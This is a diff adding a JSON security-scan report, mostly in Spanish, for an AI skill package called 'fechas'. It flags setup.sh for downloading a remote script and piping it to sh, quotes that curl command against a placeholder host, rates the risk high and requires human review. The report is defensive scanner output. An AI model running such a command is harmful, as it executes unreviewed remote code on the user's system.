@@ -1,0 +1,90 @@
+{
+  "origen": "<origen>",
+  "report_version": "3.0",
+  "seguridad": {
+    "dimensiones": {
+      "cadena_de_suministro": "bajo",
+      "comportamiento": "bajo",
+      "tecnico": "alto"
+    },
+    "escalada_por_combinacion": false,
+    "hallazgos": [
+      {
+        "ambito": "paquete",
+        "confianza": "alta",
+        "dimension": "tecnico",
+        "familia": "permisos_y_acciones",
+        "id": "SEC-EXEC-REMOTO-001",
+        "mitigacion": "Replace it with a versioned dependency that has a verifiable hash, or download and review the script before running it.",
+        "muestra": "curl -s https://ejemplo.invalid/x.sh | sh",
+        "severidad": "alta",
+        "titulo": "Downloads remote content and runs it",
+        "ubicacion": "scripts/setup.sh:2"
+      }
+    ],
+    "hay_contenido_opaco": false,
+    "nivel_riesgo": "alto",
+    "recomendacion_instalacion": "revision_humana_obligatoria"
+  },
+  "skills": [
+    {
+      "adaptaciones": [],
+      "compatibilidad": {
+        "chatgpt": [
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "url_repositorio",
+            "motivos": [],
+            "peligros": []
+          },
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "zip",
+            "motivos": [],
+            "peligros": []
+          }
+        ],
+        "claude-ai": [
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "zip",
+            "motivos": [],
+            "peligros": []
+          }
+        ],
+        "claude-code": [
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "directorio_local",
+            "motivos": [],
+            "peligros": []
+          }
+        ],
+        "mistral-vibe-work": [
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "carpeta",
+            "motivos": [],
+            "peligros": []
+          }
+        ],
+        "perplexity-computer": [
+          {
+            "bloqueo_seguridad": null,
+            "estado": "compatible",
+            "modo_instalacion": "zip",
+            "motivos": [],
+            "peligros": []
+          }
+        ]
+      },
+      "hallazgos": [],
+      "name": "fechas"
+    }
+  ]
+}
